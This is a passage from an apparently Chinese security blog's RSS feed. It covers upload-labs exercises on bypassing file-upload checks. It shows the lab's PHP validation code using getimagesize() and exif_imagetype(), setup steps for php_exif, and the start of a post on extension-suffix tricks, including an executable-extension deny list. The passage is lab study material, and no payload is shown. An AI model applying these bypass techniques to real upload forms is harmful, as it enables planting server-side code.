class=&#34;variable&#34;&gt;$_FILES&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;upload_file&amp;#x27;&lt;/span&gt;][&lt;span class=&#34;string&#34;&gt;&amp;#x27;tmp_name&amp;#x27;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$res&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;isImage&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$temp_file&lt;/span&gt;);&lt;span class=&#34;comment&#34;&gt;//调用isImage函数，参数为上传到服务器的临时文件名。返回值为上传文件类型，或者false&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(!&lt;span class=&#34;variable&#34;&gt;$res&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;quot;文件未知，上传失败！&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$img_path&lt;/span&gt; = UPLOAD_PATH.&lt;span class=&#34;string&#34;&gt;&amp;quot;/&amp;quot;&lt;/span&gt;.&lt;span class=&#34;title function_ invoke__&#34;&gt;rand&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;99&lt;/span&gt;).&lt;span class=&#34;title function_ invoke__&#34;&gt;date&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;YmdHis&amp;quot;&lt;/span&gt;).&lt;span class=&#34;variable&#34;&gt;$res&lt;/span&gt;;&lt;span class=&#34;comment&#34;&gt;//如果$res不为false，那就是拼接上传路径+/+随机数+时间戳+后缀&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;title function_ invoke__&#34;&gt;move_uploaded_file&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$temp_file&lt;/span&gt;,&lt;span class=&#34;variable&#34;&gt;$img_path&lt;/span&gt;))&amp;#123;&lt;span class=&#34;comment&#34;&gt;//将临时文件移动给新的永久路径上&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable&#34;&gt;$is_upload&lt;/span&gt; = &lt;span class=&#34;literal&#34;&gt;true&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125; &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;quot;上传出错！&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;其中，getimagesize() 函数将测定任何 GIF，JPG，PNG，SWF，SWC，PSD，TIFF，BMP，IFF，JP2，JPX，JB2，JPC，XBM 或 WBMP 图像文件的大小并返回图像的尺寸以及文件类型及图片高度与宽度。&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$remote_png_url&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;#x27;http://www.runoob.com/wp-content/themes/w3cschool.cc/assets/img/logo-domain-green2.png&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$img_data&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;getimagesize&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$remote_png_url&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;print_r&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$img_data&lt;/span&gt; );&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;输出为：&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;Array&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;(&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    [&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;] =&amp;gt; &lt;span class=&#34;number&#34;&gt;290&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    [&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;] =&amp;gt; &lt;span class=&#34;number&#34;&gt;69&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    [&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;] =&amp;gt; &lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    [&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;] =&amp;gt; width=&lt;span class=&#34;string&#34;&gt;&amp;quot;290&amp;quot;&lt;/span&gt; height=&lt;span class=&#34;string&#34;&gt;&amp;quot;69&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    [bits] =&amp;gt; &lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    [mime] =&amp;gt; image/png&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;返回结果说明&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;索引 0 给出的是图像&lt;code&gt;宽度&lt;/code&gt;的像素值&lt;/li&gt;
&lt;li&gt;索引 1 给出的是图像&lt;code&gt;高度&lt;/code&gt;的像素值&lt;/li&gt;
&lt;li&gt;索引 2 给出的是图像的&lt;code&gt;类型&lt;/code&gt;，返回的是数字，其中1 = GIF，2 = JPG，3 = PNG，4 = SWF，5 = PSD，6 = BMP，7 = TIFF(intel byte order)，8 = TIFF(motorola byte order)，9 = JPC，10 = JP2，11 = JPX，12 = JB2，13 = SWC，14 = IFF，15 = WBMP，16 = XBM&lt;/li&gt;
&lt;li&gt;索引 3 给出的是一个&lt;code&gt;宽度和高度的字符串&lt;/code&gt;，可以直接用于 HTML 的 image 标签&lt;/li&gt;
&lt;li&gt;索引 bits 给出的是图像的&lt;code&gt;每种颜色的位数&lt;/code&gt;，二进制格式&lt;/li&gt;
&lt;li&gt;索引 channels 给出的是图像的&lt;code&gt;通道值&lt;/code&gt;，RGB 图像&lt;code&gt;默认是 3&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;索引 mime 给出的是图像的&lt;code&gt;MIME 信息&lt;/code&gt;，此信息可以用来在 HTTP &lt;code&gt;Content-type&lt;/code&gt;头信息中发送正确的信息，如： header(“Content-type: image/jpeg”);&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;stripos() 函数查找字符串在另一字符串中第一次出现的位置（不区分大小写）。&lt;/p&gt;
&lt;p&gt;stripos(&lt;strong&gt;*string&lt;/strong&gt;,&lt;strong&gt;find&lt;/strong&gt;,start*)&lt;/p&gt;
&lt;div class=&#34;table-container&#34;&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th style=&#34;text-align:left&#34;&gt;参数&lt;/th&gt;
&lt;th style=&#34;text-align:left&#34;&gt;描述&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;&lt;strong&gt;string&lt;/strong&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;&lt;strong&gt;必需。规定被搜索的字符串。&lt;/strong&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;&lt;strong&gt;find&lt;/strong&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;&lt;strong&gt;必需。规定要查找的字符。&lt;/strong&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;&lt;em&gt;start&lt;/em&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;可选。规定开始搜索的位置。&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;
&lt;h3 id=&#34;绕过exif-imagety&#34;&gt;&lt;a href=&#34;#绕过exif-imagety&#34; class=&#34;headerlink&#34; title=&#34;绕过exif_imagety&#34;&gt;&lt;/a&gt;绕过exif_imagety&lt;/h3&gt;&lt;p&gt;exif_imagetype()函数是PHP中的内置函数，用于确定图像的类型。&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;int exif_imagetype( string $filename )&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;参数&lt;/strong&gt;：该函数接受单个参数$filename，该参数保存图像的名称或URL。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;返回值&lt;/strong&gt;：此函数返回与IMAGETYPE常量之一相对应的整数，如下所示：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;IMAGETYPE_GIF(1)&lt;/li&gt;
&lt;li&gt;IMAGETYPE_JPEG(2)&lt;/li&gt;
&lt;li&gt;IMAGETYPE_PNG(3)&lt;/li&gt;
&lt;li&gt;IMAGETYPE_SWF(4)&lt;/li&gt;
&lt;li&gt;IMAGETYPE_PSD(5)&lt;/li&gt;
&lt;li&gt;IMAGETYPE_BMP(6)&lt;/li&gt;
&lt;li&gt;IMAGETYPE_TIFF_II(7)&lt;/li&gt;
&lt;li&gt;IMAGETYPE_TIFF_MM(8)&lt;/li&gt;
&lt;li&gt;IMAGETYPE_JPC(9)&lt;/li&gt;
&lt;li&gt;IMAGETYPE_JP2(10)&lt;/li&gt;
&lt;li&gt;IMAGETYPE_JPX(11)&lt;/li&gt;
&lt;li&gt;IMAGETYPE_JB2(12)&lt;/li&gt;
&lt;li&gt;IMAGETYPE_SWC(13)&lt;/li&gt;
&lt;li&gt;IMAGETYPE_IFF(14)&lt;/li&gt;
&lt;li&gt;IMAGETYPE_WBMP(15)&lt;/li&gt;
&lt;li&gt;IMAGETYPE_XBM(16)&lt;/li&gt;
&lt;li&gt;IMAGETYPE_ICO(17)&lt;/li&gt;
&lt;li&gt;IMAGETYPE_WEBP(18)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;查看源码：&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;isImage&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$filename&lt;/span&gt;&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;//需要开启php_exif模块&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$image_type&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;exif_imagetype&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$filename&lt;/span&gt;);&lt;span class=&#34;comment&#34;&gt;//关键，使用exif_imagetype内置函数，返回一个图片的类型&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;switch&lt;/span&gt; (&lt;span class=&#34;variable&#34;&gt;$image_type&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;case&lt;/span&gt; IMAGETYPE_GIF:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;gif&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;comment&#34;&gt;//break;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;case&lt;/span&gt; IMAGETYPE_JPEG:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;jpg&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;comment&#34;&gt;//break;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;case&lt;/span&gt; IMAGETYPE_PNG:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;png&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;comment&#34;&gt;//break;    &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;default&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;false&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;comment&#34;&gt;//break;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$image_type&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$is_upload&lt;/span&gt; = &lt;span class=&#34;literal&#34;&gt;false&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = &lt;span class=&#34;literal&#34;&gt;null&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;submit&amp;#x27;&lt;/span&gt;]))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$temp_file&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$_FILES&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;upload_file&amp;#x27;&lt;/span&gt;][&lt;span class=&#34;string&#34;&gt;&amp;#x27;tmp_name&amp;#x27;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$res&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;isImage&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$temp_file&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$res&lt;/span&gt; == &lt;span class=&#34;literal&#34;&gt;false&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;quot;文件未知，上传失败！&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$img_path&lt;/span&gt; = UPLOAD_PATH.&lt;span class=&#34;string&#34;&gt;&amp;quot;/&amp;quot;&lt;/span&gt;.&lt;span class=&#34;title function_ invoke__&#34;&gt;rand&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;99&lt;/span&gt;).&lt;span class=&#34;title function_ invoke__&#34;&gt;date&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;YmdHis&amp;quot;&lt;/span&gt;).&lt;span class=&#34;string&#34;&gt;&amp;quot;.&amp;quot;&lt;/span&gt;.&lt;span class=&#34;variable&#34;&gt;$res&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;title function_ invoke__&#34;&gt;move_uploaded_file&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$temp_file&lt;/span&gt;,&lt;span class=&#34;variable&#34;&gt;$img_path&lt;/span&gt;))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable&#34;&gt;$is_upload&lt;/span&gt; = &lt;span class=&#34;literal&#34;&gt;true&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125; &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;quot;上传出错！&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;其中，如果要使用内置函数exif_imagetype的话，一定需要先开启php_exif模块&lt;/p&gt;
&lt;p&gt;开启方法如下：&lt;/p&gt;
&lt;p&gt;找到&lt;code&gt;C:\phpStudyB\PHP\php.ini&lt;/code&gt;文件&lt;/p&gt;
&lt;p&gt;服务器配置说明：&lt;/p&gt;
&lt;p&gt;1.在php.ini文件中找到&lt;code&gt;;extension=php_exif.dll&lt;/code&gt;，去掉前面的分号&lt;br&gt;2.在php.ini文件中找到&lt;code&gt;;extension=php_mbstring.dll&lt;/code&gt;，去掉前面的分号，并将此行移动到extension=php_exif.dll之前，使之首先加载。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;去掉分号、移动到前面后：&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;image-20221004004519109.png&#34; alt=&#34;image-20221004004519109&#34;&gt;&lt;/p&gt;
&lt;p&gt;3.找到&lt;code&gt;[exif]&lt;/code&gt;段，把下面语句的分号去掉。&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;;exif.encode_unicode = ISO-&lt;span class=&#34;number&#34;&gt;8859&lt;/span&gt;-&lt;span class=&#34;number&#34;&gt;15&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;;exif.decode_unicode_motorola = UCS-&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;BE&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;;exif.decode_unicode_intel = UCS-&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;LE&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;;exif.encode_jis =&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;;exif.decode_jis_motorola = JIS&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;;exif.decode_jis_intel = JIS&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;去掉分号后：&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;img src=&#34;image-20221004004610160.png&#34; alt=&#34;image-20221004004610160&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;开启后，如果还想再次验证是否开启exif模块的话，在WWW目录下放置phpinfo.php&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221004004840389.png&#34; alt=&#34;image-20221004004840389&#34;&gt;&lt;/p&gt;
&lt;p&gt;然后直接访问&lt;code&gt;http://www.upload_lab.com/phpinfo.php&lt;/code&gt;, 并在页面&lt;code&gt;Ctrl+F&lt;/code&gt;搜索&lt;code&gt;exif&lt;/code&gt;即可。（&lt;strong&gt;不开启是搜索不到的&lt;/strong&gt;）&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221004005007090.png&#34; alt=&#34;image-20221004005007090&#34;&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://kiyomijin.github.io/2022/10/03/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%8E%A2%E7%A9%B6/%E5%90%8E%E7%BC%80%E5%8A%A0%E7%89%B9%E6%AE%8A%E5%AD%97%E7%AC%A6%E7%BB%95%E8%BF%87/</guid>
            <title>后缀加特殊字符绕过</title>
            <link>https://kiyomijin.github.io/2022/10/03/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%8E%A2%E7%A9%B6/%E5%90%8E%E7%BC%80%E5%8A%A0%E7%89%B9%E6%AE%8A%E5%AD%97%E7%AC%A6%E7%BB%95%E8%BF%87/</link>
            <category>文件上传漏洞探究</category>
            <pubDate>Mon, 03 Oct 2022 17:24:28 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;后缀加特殊字符绕过&#34;&gt;&lt;a href=&#34;#后缀加特殊字符绕过&#34; class=&#34;headerlink&#34; title=&#34;后缀加特殊字符绕过&#34;&gt;&lt;/a&gt;后缀加特殊字符绕过&lt;/h1&gt;&lt;p&gt;本次讲解后缀加特殊字符绕过。&lt;/p&gt;
&lt;h2 id=&#34;后缀加点绕过&#34;&gt;&lt;a href=&#34;#后缀加点绕过&#34; class=&#34;headerlink&#34; title=&#34;后缀加点绕过&#34;&gt;&lt;/a&gt;后缀加点绕过&lt;/h2&gt;&lt;p&gt;常规看源码&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$is_upload&lt;/span&gt; = &lt;span class=&#34;literal&#34;&gt;false&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = &lt;span class=&#34;literal&#34;&gt;null&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;submit&amp;#x27;&lt;/span&gt;])) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;title function_ invoke__&#34;&gt;file_exists&lt;/span&gt;(UPLOAD_PATH)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$deny_ext&lt;/span&gt; = &lt;span class=&#34;keyword&#34;&gt;array&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;.php&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.php5&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.php4&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.php3&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.php2&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.html&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.htm&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.phtml&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.pht&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.pHp&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.pHp5&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.pHp4&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.pHp3&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.pHp2&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.Html&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.Htm&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.pHtml&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jsp&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jspa&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jspx&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jsw&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jsv&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jspf&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jtml&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jSp&amp;quot;&lt;/span&gt;,&lt;span 